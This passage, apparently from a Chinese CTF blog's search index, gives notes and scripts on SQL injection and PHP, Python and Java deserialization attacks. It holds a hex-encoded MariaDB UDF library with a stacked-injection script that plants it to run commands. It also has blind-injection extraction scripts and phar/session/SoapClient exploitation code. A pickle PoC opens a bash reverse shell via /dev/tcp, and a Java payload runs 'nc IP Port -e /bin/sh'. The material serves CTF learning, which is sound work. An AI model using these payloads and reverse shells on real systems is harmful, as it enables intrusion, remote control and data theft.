6465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;codes=[]for i in range(0,len(code),128): codes.append(code[i:min(i+128,len(code))])#建临时表#sql=&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;#payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)#requests.get(url+payload)#清空临时表sql=&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#插入第一段数据sql=&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;.format(codes[0])payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#更新连接剩余数据for k in range(1,len(codes)): sql=&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;.format(codes[k]) payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql) requests.get(url+payload)#10.3.18-MariaDB #写入so文件sql=&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\\&#x27;&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#引入自定义函数sql=&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\\&#x27;&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#命令执行，结果更新到界面sql=&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#查看结果r=requests.get(url[:-4]+&#x27;?page=1&amp;limit=10&#x27;)print(r.text) ​ SQLite3内置表：select name,sql from sqlite_master ​ NoSQL MongoDBMongoDB 注入指北 ​ 常用脚本 布尔盲注123456789101112131415161718192021import stringimport requestsdic=&#x27;&#123;&#125;-_&#x27;+string.digits+string.ascii_lowercaseurl=&#x27;xxxxxxx&#x27;now=&#x27;&#x27;for i in range(1,50): flag=0 for j in dic: payload=&#x27;&#x27;&#x27;xxxxxxx&#x27;&#x27;&#x27;.format() #print(payload) data=&#123;&#x27;username&#x27;:payload,&#x27;password&#x27;:&#x27;xxxxx&#x27;&#125; r=requests.post(url,data=data) #print(r.text) if &#x27;xxx&#x27; in r.text: now+=j print(now) flag=1 break if flag==0: break 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;xxx&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; data = &#123; &#x27;id&#x27;: f&quot;100&#x27;)||&#123;payload&#125;||(&#x27;0&quot; &#125; r = requests.get(url,params=data) # r = requests.post(url,data=data) if &quot;xxx&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) 时间盲注1234567891011121314151617181920212223import requestsimport stringimport timedic=&#x27;&#123;&#125;-_,&#x27;+string.ascii_lowercase+string.digitsurl=&#x27;xxxxxx&#x27;now=&#x27;&#x27;for i in range(1,50): flag=0 for j in dic: a=time.time() payload=&#x27;&#x27;&#x27;xxxxxx&#x27;&#x27;&#x27;.format() data=&#123;&#x27;ip&#x27;:payload,&quot;debug&quot;:0&#125; r=requests.post(url,data=data) b=time.time() if b-a&gt;1: now+=j flag=1 print(now) break if flag==0: break 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;http://xxx/?id=1%22and%20&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; # payload = f&#x27;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; payload = f&#x27;if(ascii(substr((select/**/group_concat(xxx)from(yyy.zzz)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; try: # data = &#123; # &#x27;uname&#x27;:f&quot;admin&#x27;)and &#123;payload&#125;#&quot;, # &#x27;passwd&#x27;: &#x27;1&#x27; # &#125; r = requests.get(url + payload,timeout=0.5) # r = requests.post(url, data=data, timeout=0.5) tail = mid except: head = mid + 1 if head != 32: result += chr(head) else: break print(result)","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://lazzzaro.github.io/tags/SQL/"},{"name":"注入","slug":"注入","permalink":"https://lazzzaro.github.io/tags/%E6%B3%A8%E5%85%A5/"}],"author":"Lazzaro"},{"title":"反序列化","slug":"web-反序列化","date":"2020-05-14T17:10:23.000Z","updated":"2022-11-29T17:16:38.389Z","comments":true,"path":"2020/05/15/web-反序列化/","link":"","permalink":"https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"概念：序列化就是使用serialize()将对象的用字符串的方式进行表示，反序列化是使用unserialize()将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。 序列化的对象可以是class也可以是Array,string等其他对象。 问题原因：漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。 ​ 序列化格式对象类型:对象名长度:”对象名”:对象成员变量个数:{变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:”变量名2”; 参数2类型:参数2长度:参数2;… …} 如： O:6:”Person”:2:{s:12:” Person name”;s:8:”Thinking”;s:11:” Person sex”;s:3:”man”;} a:2:{s:4:”name”;s:8:”Thinking”;s:3:”sex”;s:3:”man”;} 对象类型：Class-O，Array-a。 变量和参数类型：string-s，int-i，Array-a，引用-R。 序列符号：参数与变量之间用分号(;)隔开，同一变量和同一参数之间的数据用冒号(:)隔开。 类型 结构 String s:size:value; Integer i:value; Boolean b:value;(保存1或0) Null N; Array a:size:{key definition;value definition;(repeated per element)} Object O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} Reference R:2; ​ 三种访问控制的区别public: 变量名 protected: \\x00 + * + \\x00 + 变量名（或 \\00 + * + \\00 + 变量名 或 %00 + * + %00 + 变量名） private: \\x00 + 类名 + \\x00 + 变量名（或 \\00 + 类名 + \\00 + 变量名 或 %00 + 类名 + %00 + 变量名） 注：&gt;=php v7.2 反序列化对访问类别不敏感（protected -&gt; public） ​ 魔术方法12345678910111213__construct() #每次创建新对象时先调用此方法__destruct() #某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发，如 a:2:&#123;i:0;O:4:&quot;User&quot;:0:&#123;&#125;i:0;s:3:&quot;xxx&quot;;&#125;，被覆盖后没有变量指向User对象）__toString() #把类被当做一个字符串使用时调用__wakeup() #使用unserialize函数，反序列化恢复对象之前时调用__sleep() #使用serialize()函数，序列化对象之前时调用__call() #在对象中，调用不存在的方法或调用权限不足时调用__callstatic() #在静态上下文中，调用不可访问的方法时触发__get() #访问不存在的成员变量时调用__set() #设置不存在的成员变量时调用__invoke() #当尝试以调用函数的方式调用一个对象时触发__autoload() #尝试加载未定义的类__isset() #在不可访问的属性上调用isset()或empty()触发__unset() #在不可访问的属性上使用unset()时触发 ​ 绕过方法 __wakeup()失效 PHP5&lt;5.6.25 或 PHP7&lt;7.0.10 当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。 如：O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; Serialize 特性：O 改为 C bypass __wakeup 绕过preg_match()可使用+，&lt;绕过正则，如： O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; O:&lt;4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; 绕过关键字PHP序列化中存在序列化类型 S，相较于小写的 s，大写 S 是escaped字符串，会将 \\xx 形式作为一个16进制字符处理，如： n 的十六进制是 6e，所以把 name替换为 \\6eame 即可绕过。 绕过 throw new Exception 去掉最后的大括号，利用反序列化报错来防止进入 Exception GC a:2:&#123;i:0;O:7:&quot;getflag&quot;:&#123;&#125;i:0;N;&#125; 因为反序列化的过程是顺序执行的，所以到第一个属性时，会将Array[0]设置为getflag对象，同时我们又将Array[0]设置为null，这样前面的getflag对象便丢失了引用，就会被GC所捕获，便可以执行__destruct。 绕过 md5+sha1 验证判断条件： 123if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) ) &#123; eval($this-&gt;var1);&#125; 传入2个不相等对象，但是他们的 __toString 魔法函数返回的一样，可以绕过 if，且eval转为字符串时我们也使其可以被执行。 查找带 __toString 的类，满足的有 Exception/ErrorException/Error/ParseError/mysqli_sql_exception 等，以 Exception 为例，construct函数为： public function __construct($message = &quot;&quot;, $code = 0, Throwable $previous = null) 它返回的是一个字符串类型的异常信息，可以控制传入 message 和 code 的值不同即可。 123$cmd =&#x27;system(&quot;cat /flag&quot;);?&gt;&#x27;;$ex1 = new Exception($cmd);$ex2 = new Exception($cmd,1); unserialize_callback_func + spl_autoload在 php manual 里面有一个很有趣的变量配置，如果在反序列化的时候需要实例化一个未定义的类，可以设置回调函数以供调用，最关键的是这个配置是 PHP_IN_ALL 的，所以可以直接通过 ini_set 来设置。 注意: unserialize_callback_func 指令 如果在反序列化的时候需要实例化一个未定义类，则可以设置回调函数以供调用（以免得到的是不完整的 object “__PHP_Incomplete_Class”）。可通过 php.ini、ini_set() 或 .htaccess 定义‘unserialize_callback_func’。每次实例化一个未定义类时它都会被调用。若要禁止这个特性，只需置空此设定。 可以通过 spl_autoload 来自动加载未定义的类 settings，会默认加载当前目录下，以settings类名为文件名，php 或者 inc 为后缀的文件，这样就和 settings.inc 联系到了一起。 spl_autoload — __autoload()函数的默认实现 spl_autoload ( string $class_name , string $file_extensions = ? ) : void file_extensions: 在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc 或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。 ​ 反序列化字符逃逸PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的。 例子： 123456789101112131415161718&lt;?phpfunction filter($string)&#123; return str_replace(&#x27;x&#x27;,&#x27;yy&#x27;,$string);&#125;$username = &quot;peri0d&quot;;$password = &quot;aaaaa&quot;;$user = array($username, $password);var_dump(serialize($user));echo &#x27;\\n&#x27;;$r = filter(serialize($user));var_dump($r);echo &#x27;\\n&#x27;;var_dump(unserialize($r)); 正常情况下的序列化结果为 a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;。 那如果把 username 换成 peri0dxxx ，其处理后的序列化结果为 a:2:&#123;i:0;s:9:&quot;peri0dyyyyyy&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125; ， 这个时候肯定会反序列化失败，可以看到 s:9:&quot;peri0dyyyyyy&quot; 比以前多了 3 个字符。 回到前面， a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125; 它在进行修改密码之后就变为 a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;&#125;。 可以看到需要添加的字符串 &quot;;i:1;s:6:&quot;123456&quot;;&#125; 长度为 20。 假设要在 peri0d 后面填充 4 个字符，那么就是 s:30:&#39;peri0dxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#39;; 在经过处理之后就是 s:30:&#39;peri0dyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#39;; 读取 30 个字符为 peri0dyyyyyyyy&quot;;i:1;s:6:&quot;12345。 这就需要继续增加填充字符，在有 20 个 x 时，就实现了密码的修改。 $6+x+20=6+2x \\Rightarrow x=20$ 可以看到，这和 username 前面的 peri0d 是毫无关系的，只和做替换的字符串有关。 ​ phar反序列化phar文件本质上是一种压缩文件，在使用phar协议文件包含时，也是可以直接读取zip文件的。使用phar://协议读取文件时，文件会被解析成phar对象，phar对象内的以序列化形式存储的用户自定义元数据（metadata）信息会被反序列化。这就引出了我们攻击手法最核心的流程。 流程：构造phar（元数据中含有恶意序列化内容）文件—&gt;上传—&gt;触发反序列化 最后一步是寻找触发phar文件元数据反序列化。其实php中有一大部分的文件系统函数在通过phar://伪协议解析phar文件时都会将meta-data进行反序列化。 利用条件 phar文件要能够上传到服务器端。能触发的文件操作函数： include、file_get_contents、file_put_contents、copy、file、file_exists、is_executable、is_file、is_dir、is_link、is_writable、fileperms、fileinode、filesize、fileowner、filegroup、fileatime、filemtime、filectime、filetype、getimagesize、exif_read_data、stat、lstat、touch、md5_file 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 生成phar文件 首先得生成一个含有序列化metadata的phar文件。php提供一个类允许我们处理phar文件相关操作。注意要设置php.ini中phar.readonly=Off。 123456789101112131415&lt;?phpclass User &#123; Public $name；&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar，生成后可以随意修改$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); tar包装： 123456789101112131415&lt;?phpclass User &#123; Public $name；&#125;$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;@unlink(&quot;phar.tar&quot;);@system(&#x27;rm -r .phar&#x27;);@system(&#x27;mkdir .phar&#x27;);file_put_contents(&#x27;.phar/.metadata&#x27;,serialize($o));system(&#x27;tar -cf phar.tar .phar/*&#x27;);// phar://./phar.tar// phar:///var/www/html/uploads/phar.tar zip包装： 12345678910111213141516171819&lt;?phpclass User &#123; Public $name；&#125;$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;$d = serialize($o);if(file_exists(&#x27;phar.zip&#x27;)) &#123; @unlink(&quot;phar.zip&quot;);&#125;$zip = new ZipArchive;$res = $zip-&gt;open(&#x27;phar.zip&#x27;, ZipArchive::CREATE);$zip-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;file content goes here&#x27;);$zip-&gt;setArchiveComment($d);$zip-&gt;close();// phar://./phar.zip// phar:///var/www/html/uploads/phar.zip 上传到服务器 phar文件是很容易绕过上传限制的，首先它的后缀是不限制的，改成什么phar://协议都可以解析。 前面这个标志的格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt; 前面内容不限，这样可以在前面添加注入GIF98a这样的文件头绕过上传限制。 反序列化执行 直接执行测试的那份代码，phar://协议在file_get_contents函数中解析phar文件，将元数据反序列化执行魔法函数。 绕过 phar://不能出现在首部 123compress.zlib://phar://compress.bzip2://phar://php://filter/resource=phar:// 关键字 绕过如 HALT_COMPILER，使用 gzip 命令处理phar文件： gzip phar.jpg 参考：从一道题再看phar的利用 修改phar文件 改phar文件内容，因phar文件是有检验和的，所以直接改phar文件内容不可行。 参考：总结 - ctf中php的phar(一) 修复签名数据： 123456from hashlib import sha1f = open(&#x27;./ph1.phar&#x27;, &#x27;rb&#x27;).read() # 修改内容后的phar文件s = f[:-28] # 获取要签名的数据h = f[-8:] # 获取签名类型以及GBMB标识newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMBopen(&#x27;ph2.phar&#x27;, &#x27;wb&#x27;).write(newf) # 写入新文件 构造phar结构： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188from zlib import crc32from struct import packfrom time import timefrom hashlib import md5, sha1, sha256, sha512class PHAR: # 一些常量 STUB = b&quot;__HALT_COMPILER(); ?&gt;&quot; GBMB = b&quot;GBMB&quot; MD5 = b&quot;\\x01\\x00\\x00\\x00&quot; SHA1 = b&quot;\\x02\\x00\\x00\\x00&quot; SHA256 = b&quot;\\x03\\x00\\x00\\x00&quot; SHA512 = b&quot;\\x04\\x00\\x00\\x00&quot; def __init__(self, prefix: str, manifestData: dict, filesData: list, signatureType: MD5 ): self.prefix = prefix.encode() self.manifestData = manifestData self.filesData = filesData self.signatureType = signatureType def parse(self): # 检查清单的参数 if any(self.manifestData.get(each) is None for each in [&quot;loc&quot;, &quot;metaData&quot;]): return False # 至少要归档一个文件 if len(self.filesData) == 0: return False # 遍历检查文件的参数 for file in self.filesData: if any(file.get(each) is None for each in [&quot;fileName&quot;, &quot;fileContent&quot;, &quot;loc&quot;, &quot;metaData&quot;]): return False # 将字符串转换字节流 self.manifestData[&quot;metaData&quot;] = self.manifestData[&quot;metaData&quot;].encode() for file in self.filesData: for key, value in file.items(): if key in [&quot;fileName&quot;, &quot;fileContent&quot;, &quot;metaData&quot;]: file[key] = value.encode() return True def generate(self): # 检查参数 if not self.parse(): return b&quot;&quot; phar = b&quot;&quot; # stub stub = self.stub() # manifest manifest = self.manifest() files = self.file() # content contents = self.content() # 计算总长度 manifest = pack(&quot;I&quot;, len(manifest + files + contents)) + manifest[4:] # signature signature = self.signature(stub + manifest + files + contents) # 重新拼接 phar += stub + manifest + files + contents + signature return phar def stub(self): return self.prefix + self.STUB + b&quot;\\r\\n&quot; def manifest(self): # 归档文件数量 manifest = pack(&quot;I&quot;, len(self.filesData)) # 版本 manifest += b&quot;\\x11\\x00&quot; # 标识 manifest += b&quot;\\x00\\x00\\x01\\x00&quot; # 别名长度 manifest += b&quot;\\x00\\x00\\x00\\x00&quot; # 如果将序列化内容存储于此 if self.manifestData[&quot;loc&quot;]: # metadata长度 manifest += pack(&quot;I&quot;, len(self.manifestData[&quot;metaData&quot;])) # metadata内容 manifest += self.manifestData[&quot;metaData&quot;] else: manifest += pack(&quot;I&quot;, 0) # 补足长度 manifest = pack(&quot;I&quot;, 0) + manifest return manifest def file(self): files = b&quot;&quot; # 遍历归档的文件 for file in self.filesData: # 文件名长度 files += pack(&quot;I&quot;, len(file[&quot;fileName&quot;])) # 文件名 files += file[&quot;fileName&quot;] # 未压缩大小 files += pack(&quot;I&quot;, len(file[&quot;fileContent&quot;])) # 时间戳 files += pack(&quot;I&quot;, int(time())) # 压缩后大小 files += pack(&quot;I&quot;, len(file[&quot;fileContent&quot;])) # CRC32校验 files += pack(&quot;I&quot;, crc32(file[&quot;fileContent&quot;])) # 文件权限 files += pack(&quot;I&quot;, 0o666) # 如果将序列化内容存储于此 if file[&quot;loc&quot;]: # metadata长度 files += pack(&quot;I&quot;, len(file[&quot;metaData&quot;])) # metadata内容 files += file[&quot;metaData&quot;] else: files += pack(&quot;I&quot;, 0) return files def content(self): contents = b&quot;&quot; # 遍历所有归档文件 for file in self.filesData: contents += file[&quot;fileContent&quot;] return contents def signature(self, content): signature = b&quot;&quot; # 签名内容 if self.signatureType == self.MD5: signature = md5(content).digest() if self.signatureType == self.SHA1: signature = sha1(content).digest() if self.signatureType == self.SHA256: signature = sha256(content).digest() if self.signatureType == self.SHA512: signature = sha512(content).digest() # 签名标志 signature += self.signatureType # GBMB标志 signature += self.GBMB return signatureif __name__ == &#x27;__main__&#x27;: pharData = &#123; &quot;prefix&quot;: &quot;123&quot;, &quot;manifestData&quot;: &#123; &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, &quot;filesData&quot;: [ &#123; &quot;fileName&quot;: &quot;e.txt&quot;, &quot;fileContent&quot;: &quot;dsadawada&quot;, &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, &#123; &quot;fileName&quot;: &quot;c.txt&quot;, &quot;fileContent&quot;: &quot;123&quot;, &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, ], &quot;signatureType&quot;: PHAR.SHA1, &#125; p = PHAR(**pharData).generate() with open(&quot;a.phar&quot;, &quot;wb&quot;) as f: f.write(p) ​ PHP session反序列化PHP中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以sess_[sessionid]来进行命名的。 有三种方式： 默认使用php：键名|键值（经过序列化函数处理的值） name|s:6:&quot;1FonlY&quot;; php_serialize：经过序列化函数处理的值 a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;1FonlY&quot;;&#125; php_binary：键名的长度对应的ASCII字符 + 键名 + 经过序列化函数处理的值 \u0004names:6:&quot;1FonlY&quot;; 不可显的为EOT ,name的长度为4 4在ASCII 表中就是 EOT 当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。 比如这里先实例化一个对象，然后将其序列化为 O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;， 如果传入 |O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;，在使用php_serialize 引擎的时候， 序列化后的session 文件是这样的 a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;&quot;;&#125;， 这时，将a:1:&#123;s:4:&quot;name&quot;;s:31:&quot; 当做键名，O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125; 当做键值，将键值进行反序列化输出，这时就造成了序列化注入攻击。 ​ Soap反序列化SOAP : Simple Object Access Protocol简单对象访问协议。 采用HTTP作为底层通讯协议，XML作为数据传送的格式，正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法。 CRLF漏洞 SOAPAction处可控，可以把\\x0d\\x0a注入到SOAPAction，POST请求的header就可以被控制。 但Content-Type在SOAPAction的上面，就无法控制Content-Type，也就不能控制POST的数据。 在header里User-Agent在Content-Type前面，user_agent同样可以注入CRLF，控制Content-Type的值。 123456789101112131415161718&lt;?php$target = &#x27;http://127.0.0.1:5555/path&#x27;;$post_string = &#x27;data=something&#x27;;$headers = array( &#x27;X-Forwarded-For: 127.0.0.1&#x27;, &#x27;Cookie: PHPSESSID=my_session&#x27; );$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&quot;\\r\\n&quot;,$aaa);//$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;&amp;&#x27;,$aaa);echo $aaa;//echo urlencode($aaa);//$c = unserialize($aaa);//$c-&gt;not_exists_function();?&gt; 如上，使用SoapClient反序列化+CRLF可以生成任意POST请求。 Deserialization + __call + SoapClient + CRLF = SSRF ​ python反序列化与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。 python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。 与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。 pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。 12345678910# pocimport pickleimport base64class A(object): def __reduce__(self): return (eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1\\&quot;&#x27;)&quot;,))poc = A()result = pickle.dumps(poc)result = base64.b64encode(result)print(result) 参考： Python-Pickle反序列化安全问题 pickle反序列化初探 Code-Breaking中的两个Python沙箱 pickle反序列化—高校抗“疫”网络安全分享赛 从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 ​ Java反序列化Java序列化是指把Java对象转换为字节序列的过程，ObjectOutputStream 类的 writeObject() 方法可以实现序列化。 Java反序列化是指把字节序列恢复为Java对象的过程，ObjectOutputStream 类的 readObject() 方法用于反序列化。 一个类要能反序列化必须满足下面2个条件： 该类必须实现 java.io.Serializable 接口； 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 123456789101112131415161718192021222324252627282930313233343536public class User implements Serializable &#123; private String username; public User(String username) &#123; this.username = username; &#125; public String getName()&#123; return this.username; &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); Runtime.getRuntime().exec(this.username); &#125;&#125;package com.ctfshow.entity;public class UserPayload &#123; public static void main(String[] args) throws Exception &#123; String userDataPost = null; User user = new User(&quot;nc IP Port -e /bin/sh&quot;); try &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream os = new ObjectOutputStream(byteArrayOutputStream); os.writeObject(user); os.close(); byte[] userData = byteArrayOutputStream.toByteArray(); userDataPost = new String(Base64.getEncoder().encode(userData)); System.out.println(userDataPost); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 绕过 readUnshared() readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。 ​ JDBC反序列化MySQL客户端jdbc反序列化漏洞 ​ 框架反序列化（CVE） Yii2CVE-2020-15148 Yii2反序列化RCE POP链分析 我是如何挖掘yii2反序列化0day的 Laravel v5.8 Laravel 5.8 RCE 分析 ThinkPHP v5.1.x ThinkPHP 5.1.x反序列化 PHPGGCPHPGGC是一款能够自动生成主流框架的序列化测试payload的工具。 PHPGGC: PHP Generic Gadget Chains 